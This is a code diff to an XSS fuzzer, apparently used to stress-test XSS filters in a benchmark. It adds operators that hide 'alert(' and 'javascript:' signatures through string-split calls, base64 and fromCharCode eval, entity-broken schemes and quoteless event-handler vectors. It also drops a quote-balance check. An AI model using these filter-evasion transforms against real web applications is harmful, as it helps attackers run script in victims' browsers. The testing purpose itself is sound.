@@ -5,6 +5,7 @@ does not execute JavaScript.  It is intentionally conservative so that the
 original payload remains recognizable in benchmark logs.
 """
 
+import base64
 import random
 import re
 
@@ -12,6 +13,20 @@ import re
 def _random_text(length=6):
     alphabet = "xX sS tT 0123456789".replace(" ", "")
     return "".join(random.choice(alphabet) for _ in range(length))
+
+
+def _split_markup(payload):
+    """Split a payload into (context_prefix, markup) at the first '<'.
+
+    Dataset entries are reflected-XSS URLs such as ``.../page.php?ref=><script>
+    alert(1)</script>``. The prefix is the URL/reflection context and must be
+    preserved; only the injected markup should be rewritten. When there is no
+    ``<`` the whole payload is treated as markup.
+    """
+    index = payload.find('<')
+    if index == -1:
+        return '', payload
+    return payload[:index], payload[index:]
 
 
 def tag_case(payload):
@@ -48,24 +63,39 @@ def comments_rewriting(payload):
 
 
 def invariant_tags(payload):
-    """Wrap a payload in a harmless-looking inline HTML element."""
+    """Wrap only the injected markup in an inert element, keeping the prefix.
+
+    Wrapping the whole string (URL included) produced non-equivalent payloads;
+    wrapping just the markup region leaves the reflection context and the
+    executable fragment intact.
+    """
+    prefix, markup = _split_markup(payload)
+    if not markup:
+        return payload
     tag = random.choice(["b", "span", "i", "div"])
-    return f"<{tag}>{payload}</{tag}>"
+    return f"{prefix}<{tag}>{markup}</{tag}>"
 
 
 def attribute_context(payload):
-    """Place a JavaScript body into an HTML attribute context.
+    """Move the executable body into an event-handler context, keeping prefix.
 
-    This creates test strings only; the fuzzer never renders or executes them.
-    A script body is extracted when the input is a script element so that the
-    generated attribute remains syntactically meaningful.
+    Extracts the JavaScript body from the injected markup (a ``<script>`` body
+    or an ``alert``/``confirm``/``prompt`` call) and rebuilds it as an
+    equivalent event-handler vector, preserving the reflection prefix. Using
+    less-common handlers (``ontoggle``, ``onpageshow``) adds signature variety.
+    The fuzzer never renders or executes the result.
     """
+    prefix, markup = _split_markup(payload)
     script_match = re.search(
         r"<script(?:\s[^>]*)?>(.*?)</script>",
-        payload,
+        markup,
         flags=re.IGNORECASE | re.DOTALL,
     )
-    body = script_match.group(1).strip() if script_match else payload.strip()
+    if script_match:
+        body = script_match.group(1).strip()
+    else:
+        call = re.search(r"\b(?:alert|confirm|prompt)\s*\([^()]*\)", markup, re.IGNORECASE)
+        body = call.group(0) if call else ''
     if not body:
         return payload
 
@@ -74,9 +104,10 @@ def attribute_context(payload):
     variants = [
         f'<img src="x" onerror="{attribute_body}">',
         f'<svg onload="{attribute_body}"></svg>',
-        f'<a href="javascript:{attribute_body}">link</a>',
+        f'<details open ontoggle="{attribute_body}"></details>',
+        f'<body onpageshow="{attribute_body}"></body>',
     ]
-    return random.choice(variants)
+    return prefix + random.choice(variants)
 
 
 def js_comments_injection(payload):
@@ -137,6 +168,96 @@ def js_operator_rewrite(payload):
     return payload
 
 
+# ---------------------------------------------------------------------------
+# Evasion operators
+#
+# These disguise the detection signature (the literal ``alert(`` /
+# ``javascript:`` / quoted-handler tokens that rule-based and ML filters key
+# on) while preserving execution and meaning: each result pops the same dialog
+# as the original. They are what let a mutated payload slip past a filter
+# instead of merely changing representation around an intact signature.
+# ---------------------------------------------------------------------------
+
+def _call_pattern():
+    return re.compile(r"\b(alert|confirm|prompt)\s*\(([^()]*)\)", re.IGNORECASE)
+
+
+def js_keyword_split(payload):
+    """``alert(1)`` -> ``window['al'+'ert'](1)`` - same call, no ``alert(`` token."""
+    match = _call_pattern().search(payload)
+    if not match:
+        return payload
+    name = match.group(1)
+    if len(name) < 2:
+        return payload
+    cut = random.randint(1, len(name) - 1)
+    accessor = random.choice(["window", "self", "globalThis", "top"])
+    replacement = f"{accessor}['{name[:cut]}'+'{name[cut:]}']({match.group(2)})"
+    return payload[:match.start()] + replacement + payload[match.end():]
+
+
+def js_eval_base64(payload):
+    """Replace a call with ``eval(atob('<base64>'))`` - equivalent, token-free."""
+    match = _call_pattern().search(payload)
+    if not match:
+        return payload
+    encoded = base64.b64encode(match.group(0).encode("utf-8", "ignore")).decode("ascii")
+    replacement = f"eval(atob('{encoded}'))"
+    return payload[:match.start()] + replacement + payload[match.end():]
+
+
+def js_fromcharcode(payload):
+    """Replace a call with ``eval(String.fromCharCode(...))`` - equivalent."""
+    match = _call_pattern().search(payload)
+    if not match:
+        return payload
+    codes = ",".join(str(ord(char)) for char in match.group(0))
+    replacement = f"eval(String.fromCharCode({codes}))"
+    return payload[:match.start()] + replacement + payload[match.end():]
+
+
+def scheme_obfuscation(payload):
+    """Break the ``javascript:`` token with an entity it still decodes to.
+
+    In an HTML attribute/URI context the browser decodes the entity before
+    parsing the scheme, so execution is unchanged while the literal
+    ``javascript:`` signature is gone.
+    """
+    match = re.search(r"javascript:", payload, re.IGNORECASE)
+    if not match:
+        return payload
+    variants = [
+        "java&#09;script:",
+        "java&#x09;script:",
+        "jav&#97;script:",
+        "javas&#99;ript:",
+    ]
+    return payload[:match.start()] + random.choice(variants) + payload[match.end():]
+
+
+def quoteless_vector(payload):
+    """Rewrite ``<script>BODY</script>`` as a compact, separator-obfuscated tag.
+
+    Dropping quotes and using ``/`` or a tab as the attribute separator is a
+    well-known rule-bypass that browsers still execute.
+    """
+    prefix, markup = _split_markup(payload)
+    match = re.search(r"<script(?:\s[^>]*)?>(.*?)</script>", markup,
+                      flags=re.IGNORECASE | re.DOTALL)
+    if not match:
+        return payload
+    body = match.group(1).strip()
+    if not body or ('"' in body or "'" in body):
+        # Only emit a quoteless handler when the body has no quotes to clash.
+        return payload
+    variant = random.choice([
+        f"<svg/onload={body}>",
+        f"<svg\tonload={body}>",
+        f"<img/src/onerror={body}>",
+    ])
+    return prefix + markup[:match.start()] + variant + markup[match.end():]
+
+
 class XssFuzzer:
     """Generate bounded, compounded XSS representations.
 
@@ -156,6 +277,11 @@ class XssFuzzer:
         js_comments_injection,
         js_argument_rewrite,
         js_function_alias,
+        js_keyword_split,
+        js_eval_base64,
+        js_fromcharcode,
+        scheme_obfuscation,
+        quoteless_vector,
     ]
 
     def __init__(self, payload, max_length=2048, max_chain=4, max_attempts=16):
@@ -182,17 +308,21 @@ class XssFuzzer:
             return False, 'empty'
         if any(ord(char) < 9 for char in payload):
             return False, 'control-character'
-        # Unescaped quote imbalance commonly produces a non-meaningful
-        # attribute value. HTML entities are unaffected by this check.
-        for quote in ('"', "'"):
-            escaped = re.sub(r'\\' + re.escape(quote), '', payload)
-            if escaped.count(quote) % 2:
-                return False, f'unbalanced-{quote}-quote'
-        # A candidate should retain either an executable/context marker or a
-        # script-like marker from the source representation.
+        # Note: no quote-balance check. Reflected-XSS payloads legitimately
+        # carry a single break-out quote (e.g. "><script>...), so counting
+        # quotes rejects valid, effective payloads and suppresses diversity.
+        # A candidate should retain an executable/context marker. The list
+        # covers the tags, event handlers and JS sinks the operators emit,
+        # including the obfuscated forms (eval/atob/fromCharCode, split calls,
+        # entity-broken schemes) so valid evasion variants are not rejected.
         marker = re.compile(
-            r'<\s*(?:script|svg|img|iframe)|on(?:error|load|click)\s*=|'
-            r'javascript\s*:|\b(?:alert|confirm|prompt|eval)\s*\(', re.I
+            r'<\s*(?:script|svg|img|iframe|details|body|a|video|audio|'
+            r'object|embed|math|marquee|input|form)\b|'
+            r'on[a-z]+\s*=|'
+            r'java[^a-z]{0,6}script\s*:|'
+            r"\b(?:alert|confirm|prompt|eval|atob|setTimeout|setInterval)\s*\(|"
+            r'fromCharCode\s*\(|'
+            r"\[\s*['\"][a-z]", re.I
         )
         if not marker.search(payload):
             return False, 'no-xss-context'
